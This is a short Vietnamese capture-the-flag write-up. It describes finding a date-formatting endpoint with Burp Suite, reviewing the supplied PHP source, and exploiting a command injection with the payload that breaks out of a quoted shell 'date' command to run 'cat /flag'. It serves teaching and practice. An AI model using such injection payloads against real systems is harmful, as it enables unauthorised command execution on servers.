- Sử dụng burpsuite, tìm thấy 1 end point cho phép format ngày tháng

    ![alt text](image.png)
- Tìm thử nó trong file whitebox mà thử thách cung cấp
    ![alt text](image-1.png)

- Chatgpt detect vuln :v
    ![alt text](image-2.png)
- Khả năng cao là `command injection`

- Thử dùng burp repeater để tìm flag
    ![alt text](image-3.png)
- Payload ``'; echo `cat /flag` '`` :  
    1. Code cho ta biết thông tin:
        ```php
        $this->command = "date '+" . $format . "' 2>&1";
        ```
    2. Sau khi tiêm payload, code sẽ trở thành:
        ```php
        date '+<format>'; echo `cat /flag` '' 2>&1
        ```
        Dấu `'` đầu tiên sẽ kết thúc lệnh `date`, sau đó thực thi lệnh `cat /flag` 
    ![alt text](image-4.png)